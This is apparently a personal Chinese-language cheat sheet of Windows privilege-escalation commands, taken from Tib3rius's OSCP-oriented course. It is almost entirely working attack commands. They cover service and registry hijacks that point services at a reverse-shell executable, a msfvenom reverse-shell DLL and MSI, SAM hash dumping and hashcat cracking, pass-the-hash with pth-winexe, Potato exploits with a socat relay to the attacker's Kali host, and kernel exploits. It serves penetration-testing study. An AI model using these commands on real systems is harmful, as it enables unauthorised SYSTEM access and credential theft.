# Tib3rius Windows PrivEsc Light — 实操命令速查（2026-08-08 全篇精读沉淀）

来源：渗透高级.rar 内《Windows+Privilege+Escalation+(Light).pdf》161 页（OSCP 方向），全部命令为课程原文命令。

## 侦察工具的正确姿势
```cmd
# winPEAS 先开 ANSI 颜色（否则输出难读），再重开 cmd
reg add HKCU\Console /v VirtualTerminalLevel /t REG_DWORD /d 1
winPEASany.exe quiet cmd fast              # 全量快扫
winPEASany.exe quiet servicesinfo         # 只看服务
winPEASany.exe quiet windowscreds         # 只看凭据
winPEASany.exe quiet cmd searchfast filesinfo  # 文件内搜密码
# Seatbelt 枚举（不主动找洞，给线索）
Seatbelt.exe all
# PowerUp（dot-source + Invoke-AllChecks）
. .\PowerUp.ps1; Invoke-AllChecks
# accesschk 必须用旧版才有 /accepteula 命令行参数（新版弹 GUI）
accesschk.exe /accepteula -uwcqv user daclsvc           # 服务 ACL
accesschk.exe /accepteula -uwdq "C:\Program Files\"     # 目录写权限
accesschk.exe /accepteula -quvw "C:\...\svc.exe"        # 文件写权限
accesschk.exe /accepteula -uvwqk HKLM\...\Services\regsvc  # 注册表键
accesschk.exe /accepteula -d "C:\ProgramData\...\StartUp"  # 目录权限
```

## 服务提权五兄弟（sc 命令）
```cmd
sc qc <svc>        # 配置（binPath/路径）
sc query <svc>     # 状态
sc config <svc> binpath= "C:\PrivEsc\reverse.exe"   # 改执行体（= 后必须空格）
net start/stop <svc>
```
1. **Insecure Service Permissions**：accesschk 见 SERVICE_CHANGE_CONFIG → `sc config daclsvc binpath= "\"C:\PrivEsc\reverse.exe\""`（嵌套引号防空格）→ net start
   ⚠️ 兔子洞：能改配置但没 SERVICE_START/STOP 权限 = 无法触发，白忙
2. **Unquoted Service Path**：`C:\Program Files\Unquoted Path Service\Common Files\unquotedpathservice.exe` → 逐级 accesschk -uwdq 找可写目录 → `copy reverse.exe "C:\Program Files\Unquoted Path Service\Common.exe"`
3. **Weak Registry Permissions**：`Get-Acl HKLM:\System\CurrentControlSet\Services\regsvc | Format-List` 或 accesschk -uvwqk → `reg add HKLM\SYSTEM\CurrentControlSet\services\regsvc /v ImagePath /t REG_EXPAND_SZ /d C:\PrivEsc\reverse.exe /f` → net start
4. **Insecure Service Executables**：原 exe 可写 → 备份 `copy "..." C:\Temp` → `copy /Y reverse.exe "原路径"` → net start
5. **DLL Hijacking**：可写目录在 DLL 搜索 PATH + 缺 DLL → **Procmon64 过滤器**（Process Name=dllhijackservice.exe，去掉 registry/network）→ net start 看 `NAME NOT FOUND`（如 hijackme.dll）→ `msfvenom -p windows/x64/shell_reverse_tcp ... -f dll -o hijackme.dll` 放可写目录 → net stop/start

## 注册表两条
```cmd
# AutoRuns：可写 HKLM\...\CurrentVersion\Run 的 exe → 覆盖 → 重启（Win10 按最后登录用户权限跑）
reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run
# AlwaysInstallElevated：两个键都必须 =1
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
# 然后：msfvenom -f msi → msiexec /quiet /qn /i reverse.msi
```

## 密码与哈希
```cmd
reg query HKLM /f password /t REG_SZ /s            # 全注册表搜（结果多，先看已知位置）
reg query "HKLM\Software\Microsoft\Windows NT\CurrentVersion\winlogon"   # AutoLogon
reg query "HKCU\Software\SimonTatham\PuTTY\Sessions" /s                   # PuTTY
cmdkey /list                                        # 保存的凭据
runas /savecred /user:admin C:\PrivEsc\reverse.exe
dir /s *pass* == *.config && findstr /si password *.xml *.ini *.txt
type C:\Windows\Panther\Unattend.xml                # base64 密码 → echo ... | base64 -d
# SAM/SYSTEM：System32\config 锁定 → 备份 C:\Windows\Repair 或 RegBack
python2 creddump7/pwdump.py SYSTEM SAM             # 提取 NTLM
hashcat -m 1000 <hash> rockyou.txt
pth-winexe -U 'admin%aad3b435b51404eeaad3b435b51404ee:<NTLM>' //host cmd.exe   # PTH
pth-winexe --system -U '...' //host cmd.exe        # 直接 SYSTEM
```

## Potato 完整调用链（SeImpersonate/SeAssignPrimaryToken 必需）
先拿"本地服务"shell，再 Potato 提 SYSTEM（两跳）：
```cmd
# ① 用 admin 权限（或已有 admin shell）触发 local service 反向 shell
PsExec64.exe -i -u "nt authority\local service" C:\PrivEsc\reverse.exe
# ② 在 local service shell 里跑 Potato
JuicyPotato.exe -l 1337 -p C:\PrivEsc\reverse.exe -t * -c {03ca98d6-ff5d-49b8-abc6-03dd84127020}
# RoguePotato（Win10/Server2019+，需 Kali 上 socat 转发 135）：
sudo socat tcp-listen:135,reuseaddr,fork tcp:<win-ip>:9999
RoguePotato.exe -r <kali-ip> -l 9999 -e "C:\PrivEsc\reverse.exe"
# PrintSpoofer（Print Spooler 在跑即可，最简单）：
PrintSpoofer.exe -i -c "C:\PrivEsc\reverse.exe"
# Hot Potato（Win7/8/早期 Win10，spoofing+NTLM relay）：
potato.exe -ip <kali> -cmd "C:\PrivEsc\reverse.exe" -enable_httpserver true -enable_defender true -enable_spoof true -enable_exhaust true
```

## admin → SYSTEM 与端口转发
```cmd
PsExec64.exe -accepteula -i -s C:\PrivEsc\reverse.exe   # admin shell → SYSTEM
plink.exe root@<kali> -R 445:127.0.0.1:445              # 防火墙开了之后走 SSH 隧道
# Kali 侧：winexe -U 'admin%password123' //localhost cmd.exe
```

## getsystem 原理（Meterpreter，admin→SYSTEM 不是 user→admin）
1. Named Pipe Impersonation (In Memory/Admin)：建命名管道 + 建 SYSTEM 服务连管道 → impersonate
2. Named Pipe Impersonation (Dropper/Admin)：同上但 DLL 落盘
3. Token Duplication：需 SeDebugPrivilege，注入 SYSTEM 进程复制 token，**仅 x86**

## 关键特权速记（whoami /priv，disabled 也算有）
- SeImpersonate / SeAssignPrimaryToken → Potato 全家
- SeBackup → 读一切（含 SAM 备份/注册表 hive）
- SeRestore → 写一切（改服务二进制/DLL/注册表）
- SeTakeOwnership → takeown 后改 ACL 自授写权限
- SeTcb / SeCreateToken / SeLoadDriver / SeDebug（getsystem 用）

## 提权策略（Tib3rius 建议顺序）
枚举（whoami → winPEAS fast+searchfast+cmd → Seatbelt）→ 记笔记 → 翻桌面/C:\/Program Files 文件 → 先试少步骤的（注册表/服务）→ 查 admin 进程版本 Exploit-DB → 内网端口转发 → 重读枚举找异常 → 最后内核（systeminfo + wesng + SecWiki/windows-kernel-exploits，内核 exploit 不稳可能蓝屏，CVE-2018-8210 示例：`x64.exe C:\PrivEsc\reverse.exe`）
